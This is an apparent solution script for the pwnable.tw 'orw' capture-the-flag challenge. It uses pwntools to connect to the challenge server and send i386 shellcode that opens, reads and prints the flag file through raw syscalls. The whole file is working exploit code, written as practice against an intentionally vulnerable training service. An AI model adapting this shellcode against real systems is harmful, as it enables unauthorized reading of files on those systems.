from pwn import *
from LibcSearcher import LibcSearcher

#context(os='linux', arch='amd64', log_level='debug')
#
context(os='linux', arch='i386', log_level='debug')
#io = process('./orw')
#
io = connect('chall.pwnable.tw',10001)
elf=ELF('./orw')
#gdb.attach(io)

def rl():
	io.recvline()
def ru(s):
	io.recvuntil(s)
def sl(s):
	io.sendline(s)
def sd(s):
	io.send(s)

def plt(s):
	return elf.plt[s]
def got(s):
	return elf.got[s]
#orw:534
ru('shellcode:')
pl=asm('''
mov eax, 5;
push 0x00006761;
push 0x6c662f77;
push 0x726f2f65;
push 0x6d6f682f;
mov ebx, esp;
xor ecx, ecx;
xor edx, edx;
int 0x80;

mov eax, 3;
mov ebx, 3;
mov ecx, esp;
mov edx, 0x30;
int 0x80;

mov eax, 4;
mov ebx, 1;
int 0x80;
''')
sd(pl)
#
io.interactive()
